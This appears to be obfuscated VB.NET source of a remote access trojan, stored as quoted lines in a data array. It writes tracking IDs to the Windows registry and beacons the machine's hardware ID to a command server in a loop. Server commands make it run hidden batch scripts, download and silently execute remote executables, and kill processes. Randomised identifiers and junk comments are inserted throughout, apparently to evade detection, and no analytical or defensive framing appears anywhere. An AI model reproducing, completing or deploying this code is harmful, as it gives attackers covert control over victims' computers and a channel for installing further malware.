            "' anaNnKJlTkWazalfxuRnMEzMdrNBKhcGIoJOWMrBByEbipUggv",
            "                End Try",
            "            Next",
            "            Return FirstExecution_dt",
            "        End Function",
            "        Public Function GetIdentification() As String",
            "            Dim NewIdentification As String = \"\"",
            "            For Each id As String In IDs",
            "                Try",
            "                    Dim rk As Microsoft.Win32.RegistryKey",
            "                    rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\"Software\\\" & id, True)",
            "\t\t\t\t\t",
            "' zDuTibLsvQswLIqEddFNZCVBYqQqCvOxUEPURctIQRaysWYFLe",
            "                    If NewIdentification = \"\" Then",
            "                        Dim value As String = rk.GetValue(\"NewIdentification\")",
            "                        If value <> id Then NewIdentification = value ",
            "                    End If",
            "                    rk.Close()",
            "                Catch ex As Exception",
            "' mcIDECHryGWxwNDFwWydbKxSJzOYHGttVdpSlRpHTHFyROkUfl",
            "\t\t\t\tEnd Try",
            "            Next",
            "\t\t\tIf NewIdentification.Length > 50 Then ",
            "\t\t\t\tSetIdentification(\"[ERR]\")",
            "\t\t\t\tReturn \"[ERR]\"",
            "\t\t\tEnd If",
            "            Return NewIdentification",
            "        End Function",
            "\t\tPublic Function UpdateIdentification(ByVal keyName As String) As Boolean",
            "\t\t\tDim DateValue As String = \"\"",
            "\t\t\tDim IdValue As String = \"\"",
            "\t\t\tTry",
            "\t\t\t\tDateValue = GetFirstExecution().ToString(\"yyyy-MM-dd HH:mm\")",
            "\t\t\t\tIdValue = GetIdentification()",
            "\t\t\t\tIf IdValue = \"\" Then IdValue = GetFirstExecution().ToString(\"yyyyMMddHHmm\")",
            "\t\t\t\t",
            "\t\t\t\tReturn SetFirstExecution(keyName, DateValue) And SetIdentification(keyName, IdValue)",
            "\t\t\tCatch ex As Exception",
            "\t\t\t\tReturn False",
            "            End Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Function UpdateIdentificationFromURL(ByVal keyName As String, ByVal url As String) As Boolean",
            "\t\t\tDim DateValue As String = \"\"",
            "\t\t\tDim IdValue As String = \"\"",
            "\t\t\tTry",
            "\t\t\t\tDateValue = GetFirstExecution().ToString(\"yyyy-MM-dd HH:mm\")",
            "\t\t\t\tIdValue = GetIdentification()",
            "\t\t\t\tIf IdValue = \"\" Then IdValue = GetFirstExecution().ToString(\"yyyyMMddHHmm\")",
            "\t\t\t\t",
            "\t\t\t\tReturn SetFirstExecution(keyName, DateValue) And SetIdentification(keyName, IdValue)",
            "\t\t\tCatch ex As Exception",
            "\t\t\t\tReturn False",
            "            End Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Function SetFirstExecution(ByVal keyName As String, ByVal DateValue As String) As Boolean",
            "\t\t\tTry",
            "\t\t\t\tDim rk As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(\"Software\\\" & keyName)",
            "\t\t\t\trk.SetValue(\"FirstExecution\", DateValue)",
            "\t\t\tCatch ex As Exception",
            "\t\t\t\tReturn False",
            "            End Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Function SetIdentification(ByVal IdValue As String) As Boolean",
            "\t\t\tReturn SetIdentification(IDs(0) , IdValue) ",
            "\t\tEnd Function",
            "\t\tPublic Function SetIdentification(ByVal keyName As String, ByVal IdValue As String) As Boolean",
            "\t\t\tTry",
            "\t\t\t\tDim rk As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(\"Software\\\" & keyName)",
            "\t\t\t\trk.SetValue(\"NewIdentification\", IdValue)",
            "\t\t\t\trk.SetValue(\"Identification\", IdValue & \"_\" & GetVolumeSerial() )",
            "\t\t\tCatch ex As Exception",
            "\t\t\t\tReturn False",
            "            End Try",
            "\t\t\tReturn True",
            "\t\tEnd Function",
            "\t\tPublic Function SetIdentificationFromURL(ByVal url As String) As Boolean",
            "\t\t\tReturn SetIdentificationFromURL(IDs(0) , url) ",
            "\t\tEnd Function",
            "\t\tPublic Function SetIdentificationFromURL(ByVal keyName As String, ByVal url As String) As Boolean",
            "\t\t\tTry",
            "\t\t\t\tDim IdValue As String = \"\"",
            "\t\t\t\t",
            "\t\t\t\turl = url & \"?id=\" & GetIdentification() & \"_\"& GetVolumeSerial()",
            "\t\t\t\tDim request As Net.HttpWebRequest = Net.HttpWebRequest.Create(url)",
            "\t\t\t\tWith request",
            "\t\t\t\t\t.UserAgent = \"\"",
            "\t\t\t\t\t.Method = \"GET\"",
            "\t\t\t\t\t.Timeout = 60 * 1000",
            "\t\t\t\tEnd With",
            "\t\t\t\tDim response As Net.HttpWebResponse  = request.GetResponse()",
            "\t\t\t\t",
            "            Dim sr As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream())",
            "\t\t\t\tDim responseData As String = sr.ReadToEnd()",
            "\t\t\t\tresponse.Close()\t\t",
            "\t\t\t\tIf responseData.Contains(\"_\") Then",
            "\t\t\t\t\tIdValue = responseData.SubString(0, responseData.IndexOf(\"_\"))",
            "\t\t\t\tElse If responseData.Length < 40 Then",
            "\t\t\t\t\tIdValue = responseData",
            "\t\t\t\tElse",
            "\t\t\t\t\tIdValue = \"\"",
            "\t\t\t\tEnd If",
            "\t\t\t\t",
            "\t\t\t\tIf IdValue = \"\" Then",
            "\t\t\t\t\tReturn False",
            "\t\t\t\tElse",
            "\t\t\t\t\tReturn SetIdentification(keyName, IdValue)",
            "\t\t\t\tEnd If",
            "\t\t\tCatch ex As Exception",
            "\t\t\t\tReturn False",
            "            End Try",
            "\t\tEnd Function\t\t",
            "\t\tPublic Function RemoveOldIdentification() As Boolean",
            "\t\t\tTry",
            "\t\t\t\tDim rk As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(\"Software\\\", True)",
            "\t\t\t\tFor Each skName As String In rk.GetSubKeyNames()",
            "\t\t\t\t\tFor i As Integer = 1 To IDs.Count - 1",
            "\t\t\t\t\t\tDim keyName As String = IDs(i)",
            "\t\t\t\t\t\tIf skName.ToLower = keyName.ToLower Then rk.DeleteSubKey(skName, False)",
            "\t\t\t\t\tNext",
            "\t\t\t\tNext",
            "\t\t\t\trk.Close()",
            "\t\t\t\tReturn True",
            "\t\t\tCatch ex As System.Exception",
            "\t\t\t\tReturn False",
            "\t\t\tEnd Try",
            "\t\tEnd Function",
            "        Public Function StrToDateTime(ByVal str As String) As DateTime",
            "            Try",
            "\t\t\t\t Dim DateTimeList As String() = { _",
            "\t\t\t\t\t\t\t\t\t\t\"yyyy-MM-dd\", _",
            "\t\t\t\t\t\t\t\t\t\t\"yyyy-MM-dd HH:mm\", _",
            "\t\t\t\t\t\t\t\t\t\t\"dd/MM/yyyy -- HH:mm\", _",
            "\t\t\t\t\t\t\t\t\t\t\"MM/dd/yyyy\" _",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\tDim dt As DateTime = DateTime.ParseExact(str, _",
            "\t\t\t\t\t\t  DateTimeList, _",
            "\t\t\t\t\t\t  System.Globalization.CultureInfo.InvariantCulture, _",
            "\t\t\t\t\t\t  System.Globalization.DateTimeStyles.AllowWhiteSpaces _",
            "\t\t\t\t\t  )",
            "                Return dt",
            "            Catch ex As Exception",
            "                Return DateTime.Now",
            "            End Try",
            "        End Function",
            "    End Class",
            "' alDEZajIoShOUnvlRMNLQBtBfGrIMOGfImXSHbSJWhQPDoQmyN",
            "' uMxDcQOIaXtQotqCFUpqzKFixRkEynTcdbgRKSvJIYceWvLDnV",
            "Public Class WebInterpreter",
            "' KeHLZjFSFrTpnQxPBFfFQKcZwSqjfqIWrfpNIkmTnsBqWffejG",
            "' NUyMLbehZxNGpYauXcpmViIIjrFgzfEVvVgascyitzvHYmuvGd",
            "    Public HWID As String = \"\"",
            "    Public RATID As String = \"\"",
            "    Public RATNO As Integer = 0",
            "    Public CONN_TIMEOUT As Integer = 60 * 1000",
            "    Public LISTEN_INTERVAL As Integer = 90 * 1000",
            "    Public NEXT_INTERVAL As Integer",
            "    Public VERSION_BUILD As String = \"1.10.29\"",
            "' YCDjqJRHmhiglXdkCcbrhkbBdJHodxnesDllYYzIVwRvUlxmjd",
            "    Public ifClvCxKbcxyIfNqGmsMUKpkljoZSZEeQgjmeEgLvqfzqhuGon As String = \"\"",
            "    Public bNoLXlTkWaBomgyvSoNSPadsOPYidHWpJcXMrBCzFpipUhgwBD As String = \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.98 Safari/534.13 ChromePlus/1.5.3.0alpha5\"",
            "    Public hGVOxfiDfjxIdqdQrOMoWnZdDdoiBxVqPHEPguQENlgJLrMRZP As New System.Collections.Hashtable",
            "' uEEDIelsXkjzDGxWleOwyTvzOLtHggIQcFYEctUtFyRBXHSYUf",
            "    Public startTime, lastStartTime As DateTime",
            "' wLTUeCwabIPhpfLGHFKuCJZBzQGJzZCgeNBWMDRbKKwwYgtVoU",
            "    Public lDPDBuNKgQbhdoGHcdnLrVkRXqyoUPQOTExFiKuLPRJiLpaWKf As New System.Collections.ArrayList",
            "' VMakTTGsTpDRxQCGfTRLdawTrxtFIXstENIlBUoHCrXfgejVOV",
            "    Sub New(ByVal reqUrl As String)",
            "        ifClvCxKbcxyIfNqGmsMUKpkljoZSZEeQgjmeEgLvqfzqhuGon = reqUrl",
            "        HWID = HardwareID.Generate()",
            "        NEXT_INTERVAL = LISTEN_INTERVAL",
            "        Call Refresh()",
            "    End Sub",
            "    Public Sub Refresh()",
            "        RATID = New RATID().GetIdentification",
            "        RATNO = System.Diagnostics.Process.GetProcessesByName(\"winlogon\").Length - 1 + System.Diagnostics.Process.GetProcessesByName(\"vbc\").Length",
            "    End Sub",
            "    Public Sub Start()",
            "\t\tstartTime = DateTime.Now()",
            "\t\tCall Listen()",
            "    End Sub",
            "    Public Sub Listen()",
            "        Dim listenUrl As String = ifClvCxKbcxyIfNqGmsMUKpkljoZSZEeQgjmeEgLvqfzqhuGon",
            "        Dim counter As Integer = 0",
            "        While (True)",
            "            Dim lastStartTime As DateTime = DateTime.Now",
            "' DlwDyKbqxzJgbFHntNVKpllkoagnFfeuknfEhMKrgBqhvGoobb",
            "            counter += 1",
            "            Try",
            "' pxKmGlJbnbZTliFozFCNefBCLjQtJpvPXNsnomrcVdHiTjnphH",
            "                With hGVOxfiDfjxIdqdQrOMoWnZdDdoiBxVqPHEPguQENlgJLrMRZP",
            "                    .Item(\"hwid\") = HWID",
            "                    .Item(\"rid\") = RATID",
            "                    .Item(\"rno\") = RATNO",
            "\t\t\t\t\t.Item(\"interval\") = LISTEN_INTERVAL",
            "                End With",
            "' qpufYfKXWmpskJYRBjlGinBLgthTuRQrZqcgHgrlEBYtSLHSjx",
            "                Dim majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ As System.Net.HttpWebRequest = DirectCast(System.Net.HttpWebRequest.Create(listenUrl), System.Net.HttpWebRequest)",
            "                majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ = PrepareHttpWebRequest(majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ)    'Prepare",
            "                majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ.Method = \"POST\"",
            "                majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ = AttachPostData(majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ, hGVOxfiDfjxIdqdQrOMoWnZdDdoiBxVqPHEPguQENlgJLrMRZP) 'PostData",
            "                Dim noCachePolicy As System.Net.Cache.HttpRequestCachePolicy = New System.Net.Cache.HttpRequestCachePolicy(System.Net.Cache.HttpRequestCacheLevel.NoCacheNoStore)",
            "                majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ.CachePolicy = noCachePolicy",
            "' iUNUyZLaehZxaGplaukbpziiVIjFSgOfRVujgaspNiHNJUYmIK",
            "                Dim FPKnDWpJEsYhiglWPWBONdhjbBQIsacwZerDXkYKlIHiQhTXxY As System.Net.HttpWebResponse = majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ.GetResponse()",
            "                Dim responseData As String = New System.IO.StreamReader(FPKnDWpJEsYhiglWPWBONdhjbBQIsacwZerDXkYKlIHiQhTXxY.GetResponseStream()).ReadToEnd()",
            "                FPKnDWpJEsYhiglWPWBONdhjbBQIsacwZerDXkYKlIHiQhTXxY.Close()",
            "' mcIDECHslsWxiyDGwWyeOKyTJzOYHHtgHdqFmEptTIFyROkHfl",
            "' hswLgirBvZpIcvpfLUUSXJCJnzzPTWOmCueMPjMQeoKXKwYtsV",
            "                hGVOxfiDfjxIdqdQrOMoWnZdDdoiBxVqPHEPguQENlgJLrMRZP.Clear()",
            "                NEXT_INTERVAL = LISTEN_INTERVAL",
            "' YsVZnjTgGGhpCexdBTsTeYqawgrwtFWkstDbVyBhnHPFkfgejU",
            "                Call InterpretRequest(responseData)",
            "            Catch ex As Exception",
            "                NEXT_INTERVAL = LISTEN_INTERVAL",
            "' biyZZofhZybGElaulcpBjiWWxGSuOtRjvjhbtqNwINKVmnJKTr",
            "            End Try",
            "            Try",
            "                Call Refresh() 'Refresh ",
            "' KnEkqKSHmiihlXQXCcOehkcBeJsodxnesDllYLmJVjRiUYxmjd",
            "                Dim sleepTime As Integer = NEXT_INTERVAL - (DateTime.Now - lastStartTime).TotalMilliseconds",
            "' vsQlKQMYbpLNWgbEUZsMHvbkljoZTaERQgkmeETLvdfBdhvGao",
            "                If sleepTime > 0 Then System.Threading.Thread.Sleep(sleepTime)",
            "' bOoLKmTkXbBbmgyvSoNFBNdsOCLidHJpKPXNsBCzFcjqUhgwBE",
            "            Catch ex As Exception",
            "' uUjcMtwRtxMIqFeeFOaDWCZrRrDwPyVFPVRduJRSbytXZGMfnd",
            "            End Try",
            "        End While",
            "    End Sub",
            "    Private Function PrepareHttpWebRequest(ByRef majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ_PHW As System.Net.HttpWebRequest) As System.Net.HttpWebRequest",
            "\t\tWith majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ_PHW",
            "\t\t\t.UserAgent = bNoLXlTkWaBomgyvSoNSPadsOPYidHWpJcXMrBCzFpipUhgwBD",
            "\t\t\t.Timeout = CONN_TIMEOUT",
            "\t\t\t.AllowAutoRedirect = True",
            "\t\tEnd With     ",
            "        Return majHCfhOhnvkQZaYdBIPsGFVZbTsIzkSUpSWkgPdDDdmybuaxQ_PHW",
            "    End Function",
            "    Private Function AttachPostData(ByVal request As System.Net.HttpWebRequest, ByVal postDataCollection As System.Collections.Hashtable) As System.Net.HttpWebRequest",
            "        Dim queryString As String = \"\"",
            "        Try",
            "            Dim postDataArray As New System.Collections.ArrayList",
            "            For Each key As String In postDataCollection.Keys",
            "                Dim value As String = postDataCollection(key)",
            "                postDataArray.Add(key & \"=\" & value)",
            "            Next",
            "            queryString = Convert.ArrayListToString(postDataArray, \"&\")",
            "        Catch ex As Exception",
            "' zMMcfiayOHqYbvYcqnWjJJksFhBgFWvWhbtdzjuzwIZnvwGeZC",
            "            queryString = \"hwid=\" & HWID & \"&rid=\" & RATID & \"&rno=\" & RATNO",
            "        End Try",
            "        Return AttachPostData(request, queryString)",
            "    End Function",
            "    Private Function AttachPostData(ByVal request As System.Net.HttpWebRequest, ByVal queryString As String) As System.Net.HttpWebRequest",
            "        If queryString.Length > 0 Then",
            "            request.Method = \"POST\"",
            "            request.ContentType = \"application/x-www-form-urlencoded\"",
            "            Dim postBytes As Byte() = System.Text.Encoding.UTF8.GetBytes(queryString)",
            "            request.ContentLength = postBytes.Length",
            "' EkqKSInijhmXelCdcsikcCeJHpdyoftEmmZZBJWxRwVmymkewt",
            "' QzLRNYpqMNXubFUBIaiYEyzxDohoSteuyCsSuaKGuPFvKUDDpc",
            "' pMYmUlXbCpmhywToNTPbesPQZjeIXpKdXNsCDBGqjqVihxBEvV",
            "' jcNuwRtyMWrFseGcbDkCnrSsExQNjFeWSduKfTczuYaHagodJS",
            "            Dim requestStream As System.IO.Stream = request.GetRequestStream()",
            "            requestStream.Write(postBytes, 0, postBytes.Length)",
            "        Else",
            "            request.Method = \"GET\"",
            "        End If",
            "        Return request",
            "    End Function",
            "' FDIfmtYkkzEHyXmfPwzUwBPMuIhhJRdGZFcuUuGzSCYITYVgxM",
            "    Public Function InterpretRequest(ByVal data As String) As Boolean",
            "        Dim ret As Boolean = True",
            "        Try",
            "            Dim xmlDoc As New System.Xml.XmlDocument",
            "            xmlDoc.LoadXml(data)",
            "            For Each node As System.Xml.XmlNode In xmlDoc.GetElementsByTagName(\"request\")",
            "                Dim requestId As Integer = node.Attributes(\"id\").Value",
            "                Dim requestName As String = \"\"",
            "                Dim requestValue As New System.Collections.ArrayList",
            "                For Each childNode As System.Xml.XmlNode In node.ChildNodes",
            "                    Select Case childNode.Name",
            "                        Case \"name\"",
            "                            requestName = childNode.InnerText",
            "                        Case \"value\"",
            "                            requestValue.Add(childNode.InnerText)",
            "                    End Select",
            "' UVeDxacJPiqgMHIGLvDKaCBRHJBaDhfOCWNEScLKxxZhtWpVtL",
            "                Next",
            "                If IsNewRequest(requestId) Then",
            "                    Dim request_ret As Boolean = ProcessRequest(requestName, requestValue)",
            "                    If request_ret Then",
            "                        Call FinishRequest(requestId)",
            "                    Else",
            "                        ret = False",
            "                    End If",
            "' JxuoHEbLVbXjzBWYhFmPfMSltiOKKJOyrydEpGJMEcGkUQFZQH",
            "                Else",
            "' UeNNBmOkwLsKvzaOLFXUrNlrnzDRmoxIDgvOiCvlRaaZePIPtH",
            "                End If",
            "            Next",
            "        Catch ex As Exception",
            "            ret = False",
            "' GWZcUsIBkTVpSXkuQdRDeBzbJaMQqRcWolIdCuqCTiEqBYTwye",
            "        End Try",
            "        Return ret",
            "    End Function",
            "' djrgMVWUZwELoCBRVXPoEvgOQlOSgcLZyyZiuXqWtMlMXRjSpZ",
            "' jplxOdkmvTOrtagzIxdYYXcNUbrSRhXaSqUyweTneViscbPPpy",
            "    Public Function IsNewRequest(ByVal requestId As Integer) As Boolean",
            "        If lDPDBuNKgQbhdoGHcdnLrVkRXqyoUPQOTExFiKuLPRJiLpaWKf.IndexOf(requestId) < 0 Then",
            "            Return True",
            "        End If",
            "        Return False",
            "    End Function",
            "    Public Sub FinishRequest(ByVal requestId As Integer)",
            "        If lDPDBuNKgQbhdoGHcdnLrVkRXqyoUPQOTExFiKuLPRJiLpaWKf.IndexOf(requestId) < 0 Then",
            "            lDPDBuNKgQbhdoGHcdnLrVkRXqyoUPQOTExFiKuLPRJiLpaWKf.Add(requestId)",
            "        End If",
            "    End Sub",
            "' RpkNPvQVdTyIIHMipwbonEHKCapiSBDXzESPxLkkMUgJcIgxYx",
            "    Public Function ProcessRequest(ByVal requestName As String, ByVal requestValue As System.Collections.ArrayList) As Boolean",
            "        Dim ret As Boolean",
            "        Select Case requestName",
            "            Case \"batch\"",
            "                Return RunBatch(requestValue)",
            "            Case \"disconnect\"",
            "                Call Disconnect()",
            "            Case \"execFromUrl\"",
            "                Return ExecFromUrl(requestValue)",
            "            Case \"getInfo\"",
            "                Return GetInfo()",
            "            Case \"interval\"",
            "                ret = setInterval(requestValue)",
            "                Call GetInfo()",
            "                Return ret",
            "            Case \"killProcess\"",
            "                Return KillProcess(requestValue)",
            "            Case \"setRATID\"",
            "                ret = SetRATID(requestValue)",
            "                Call GetInfo()",
            "                Return ret",
            "        End Select",
            "        Return False",
            "    End Function",
            "' JDVFbLWcYjBPXYiGBefMTltjPKLJOyGNdFEUKNEdGliRFaQHVf",
            "    Public Function GetStringFromArrayList(ByVal al As System.Collections.ArrayList, ByVal index As Integer, Optional ByVal defaultValue As String = \"\") As String",
            "        If index >= al.Count Then",
            "            Return defaultValue",
            "        Else",
            "            Return al(index)",
            "        End If",
            "    End Function",
            "    Public Function GetNumberFromArrayList(ByVal al As System.Collections.ArrayList, ByVal index As Integer, Optional ByVal defaultValue As Integer = 0) As Integer",
            "        If index >= al.Count Then",
            "            Return defaultValue",
            "        Else",
            "            Return al(index)",
            "        End If",
            "    End Function",
            "    Public Function DateTimeToTimestamp(ByVal dt As DateTime) As Integer",
            "        Try",
            "            Dim span As TimeSpan = dt - New DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()",
            "            Return span.TotalSeconds",
            "        Catch ex As Exception",
            "            Return 0",
            "        End Try",
            "    End Function",
            "    Public Function ArrayListToStringArray(ByVal al As System.Collections.ArrayList) As String()",
            "        Try",
            "            Return CType(al.ToArray(GetType(String)), String())",
            "        Catch ex As Exception",
            "            Return New String() {}",
            "        End Try",
            "    End Function",
            "' zznnOXjMfLiBNBxrKIeOYeamDEZbkIpTiPVowmSNNMRCuCgHsJ",
            "' MPHfJnYTIcTKXhRQEpRnzOvNyDdRPJbYuQpuqDGVqrBLGjySlF",
            "' zoUdechSLSwKJZdfXwMEoWYsVanyTgUGhEDeMwimMmxrKHdzYQ",
            "    Public Function RunBatch(ByVal values As System.Collections.ArrayList) As Boolean",
            "        If values.Count = 0 Then Return False",
            "        Try",
            "            Dim content As String = GetStringFromArrayList(values, 0, \"\")",
            "            Dim wait As Integer = GetNumberFromArrayList(values, 1, 0)",
            "            Dim batchFile As String = System.IO.Path.GetTempFileName",
            "            batchFile = batchFile.Replace(System.IO.Path.GetExtension(batchFile), \"\") & \".bat\"",
            "            Dim sw As System.IO.StreamWriter = New System.IO.StreamWriter(batchFile, False, System.Text.Encoding.GetEncoding(950))",
            "' MYoEZNWtoSUBVaiYEMNLQnuCgssIMPGfunXFIcFJXTDQppQZlO",
            "            sw.WriteLine(\"@ECHO OFF\")",
            "            sw.WriteLine(content)",
            "            sw.Close()",
            "            Dim PSI As New System.Diagnostics.ProcessStartInfo(batchFile)",
            "            PSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden",
            "            PSI.CreateNoWindow = True",
            "            Dim aProcess As New System.Diagnostics.Process",
            "            aProcess.StartInfo = PSI",
            "            aProcess.Start()",
            "            If wait < 0 Then",
            "                aProcess.WaitForExit()",
            "                System.IO.File.Delete(batchFile)",
            "            ElseIf wait > 0 Then",
            "                aProcess.WaitForExit(wait)",
            "                aProcess.Close()",
            "                System.IO.File.Delete(batchFile)",
            "            End If",
            "            Return True",
            "        Catch ex As Exception",
            "' hNkDcDOIaKgQagcoGUcdmKFikRXqyoUPQOTELSiJJYPRJiLpnV",
            "            Return False",
            "        End Try",
            "    End Function",
            "' wRHxMWFFrrTboQkPnFRGDwPMjTdjfqIJegpNtXnUatCqWSSRVH",
            "' zHlMxNRUMkOscYNhXOcmVVIuWsFTBSEIhWTNfczVtzvILZuwGQ",
            "    Public Sub Disconnect()",
            "        Try",
            "            Dim aProcess As System.Diagnostics.Process = System.Diagnostics.Process.GetCurrentProcess",
            "            aProcess.Kill()",
            "        Catch ex As Exception",
            "' wapJcvqfLUVTYJCKnBzQUWOnDufNPjMRfpKYLxYutWDUHLkLWQ",
            "        End Try",
            "    End Sub",
            "' ifCYwokwNcxluSNqsZtyHvckljoMTaERQgkneETMvdfBdhvrao",
            "' zzbjwYrXvNnNYSkUqalrnyQemnxVQtubiBJyeZaYdPVcsUTjZc",
            "    Public Function ExecFromUrl(ByVal values As System.Collections.ArrayList) As Boolean",
            "        If values.Count = 0 Then Return False",
            "        Try",
            "            Dim remoteUrl As String = GetStringFromArrayList(values, 0, \"\")",
            "            Dim wait As Integer = GetNumberFromArrayList(values, 1, 0)",
            "            Dim localFileName As String = GetStringFromArrayList(values, 2, \"\")",
            "            If Not remoteUrl.ToLower.StartsWith(\"http\") Then Return False",
            "            Dim request As System.Net.HttpWebRequest",
            "            Dim response As System.Net.HttpWebResponse",
            "            request = DirectCast(System.Net.HttpWebRequest.Create(remoteUrl), System.Net.HttpWebRequest)",
            "            request.Method = \"GET\"",
            "            request.UserAgent = bNoLXlTkWaBomgyvSoNSPadsOPYidHWpJcXMrBCzFpipUhgwBD",
            "            request.Timeout = CONN_TIMEOUT",
            "            request.AllowAutoRedirect = True",
            "            response = request.GetResponse()",
            "            Dim downloadedData As Byte() = New Byte() {}",
            "            If response.StatusCode < 400 And response.ContentLength > 5 * 1024 Then",
            "                Dim remoteStream As System.IO.Stream = response.GetResponseStream()",
            "                Dim memStream As System.IO.MemoryStream = New System.IO.MemoryStream()",
            "                Dim buffer As Byte() = New Byte(1024) {}",
            "                Dim dataLength As Integer = response.ContentLength",
            "                Dim bytesRead As Integer",
            "                Do",
            "                    bytesRead = remoteStream.Read(buffer, 0, buffer.Length)",
            "                    memStream.Write(buffer, 0, bytesRead)",
            "                Loop While bytesRead > 0",
            "                downloadedData = memStream.ToArray()",
            "                remoteStream.Close()",
            "                memStream.Close()",
            "            End If",
            "            response.Close()",
            "            If downloadedData.Length > 0 Then",
            "                If localFileName.Length = 0 Then",
            "                    localFileName = System.IO.Path.GetTempFileName.Replace(\".tmp\", \".exe\")",
            "                    Try",
            "                        localFileName = localFileName.Replace(\".exe\", System.IO.Path.GetExtension(response.ResponseUri.AbsoluteUri))",
            "                    Catch ex As Exception",
            "' nijhmXRYCdOeilcCeKtpdyoftEmmZMmJWkRjVZynkewtQmLRNY",
            "                    End Try",
            "                End If",
            "\t\t\t\tIf System.IO.Path.GetExtension(localFileName).Length = 0 Then localFileName = localFileName & \".exe\"",
            "                Dim newFile As System.IO.FileStream = New System.IO.FileStream(localFileName, System.IO.FileMode.Create)",
            "                newFile.Write(downloadedData, 0, downloadedData.Length)",
            "                newFile.Close()",
            "                Dim PSI As New System.Diagnostics.ProcessStartInfo(localFileName)",
            "                PSI.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden",
            "                PSI.CreateNoWindow = True",
            "                PSI.UseShellExecute = True",
            "                Dim aProcess As New System.Diagnostics.Process",
            "                aProcess.StartInfo = PSI",
            "                aProcess.Start()",
            "                If wait < 0 Then",
            "                    aProcess.WaitForExit()",
            "                ElseIf wait > 0 Then",
            "                    aProcess.WaitForExit(wait)",
            "                    aProcess.Close()",
            "                End If",
            "                If aProcess.HasExited Then System.IO.File.Delete(localFileName)",
            "                Return True",
            "            End If",
            "        Catch ex As Exception",
            "' bqMNXgbFVnIbVLqzzxDohoTffuyCtShaKruPrvKUpDpcEZYBiz",
            "        End Try",
            "        Return False",
            "    End Function",
            "' lpPpBuNKhDbTQbsHcQZxrVXEYdlbHQDBGdjqVihxCEvVkcNuwR",
            "' tyMJrFeeGObDXCarSsExQyWGQWSeuKRTczuYaHNgodJFFEItzI",
            "    Public Function KillProcess(ByVal values As System.Collections.ArrayList) As Boolean",
            "        If values.Count = 0 Then Return False",
            "        Try",
            "            Dim ProcessToBeKilled As New System.Collections.ArrayList",
            "            Dim ProcessNameList As String = GetStringFromArrayList(values, 0, \"\")",
            "            For Each aProcessName As String In ProcessNameList.Split(\",\")",
            "                aProcessName = System.IO.Path.GetFileNameWithoutExtension(aProcessName.Trim())",
            "                ProcessToBeKilled.Add(aProcessName)",
            "            Next",
            "            Call bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh.HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(ProcessToBeKilled)",
            "            Return True",
            "        Catch ex As Exception",
            "' oLjplwzPklvFzdsMgytjPXYWbNGNqEDTXaRqGyiQTnQUisNbOB",
            "            Return False",
            "        End Try",
            "    End Function",
            "' bxwZHYKOnOZTliFbzrnzRfBoxVQtvcwCKzfoomrPWdIUUjnqiH",
            "' WPygjEgkyuerRRsBNpJoMeEepjClIrDIFQhvEFOmgKMsySaQvq",
            "    Public Function setInterval(ByVal values As System.Collections.ArrayList) As Boolean",
            "        If values.Count = 0 Then Return False",
            "        Try",
            "            Dim newInterval = GetNumberFromArrayList(values, 0, LISTEN_INTERVAL)",
            "            If newInterval > 0 Then",
            "                LISTEN_INTERVAL = newInterval",
            "            End If",
            "            Return True",
            "        Catch ex As Exception",
            "' dcgSYfwXWmcfXvZECjYsiZnxggTTuEQrMqPhsheYqnLuFLHTjk",
            "            Return False",
            "        End Try",
            "    End Function",
            "' GIRoWyPvCVdSxttsxibiGgShlogFiNwshCriwHppcPqMZnVmYc",
            "' ocaUmjGbBGDORgCDMWRuKdwQLzfopnsdWdIVUkoqiIXPzhjEgl",
            "    Public Function SetRATID(ByVal values As System.Collections.ArrayList) As Boolean",
            "        If values.Count = 0 Then Return False",
            "        Try",
            "            Dim newId As String = GetStringFromArrayList(values, 0, \"\")",
            "            Dim RAT_KEY As String = GetStringFromArrayList(values, 1, \"\")",
            "            If newId.Length = 0 Then Return False",
            "            Call bYvRphepHVqenMGjlSmrzpVeediFMTxLKadgYwMFoXZtWaolUh.HHiqDfyeDUuUfZrbxhsyuGXltuFcXBCioIQGlghfkVcjzbaqgi(New String() {\"winlogon\", \"vbc\"})",
            "            Dim RATID As New RATID()",
            "            If RAT_KEY.Length = 0 Then",
            "                Return RATID.SetIdentification(newId)",
            "            Else",
            "                Return RATID.SetIdentification(RAT_KEY, newId)",
            "            End If",
            "        Catch ex As Exception",
            "' QjrhNIIHMwELbCBRHKCaEigODXOFScLLyyZiuXqWtMYMJEVTpZ",
            "            Return False",
            "        End Try",
            "    End Function",
            "' WcYjBCXYiGmQfMTltjPKLJOzszeFqGKNEdGlVRGaQHVfOOBnOk",
            "' xMtLwBaPMGYVrOmsozESnpyIDgwPjDwmSbbaeQJQuHHWadVtJC",
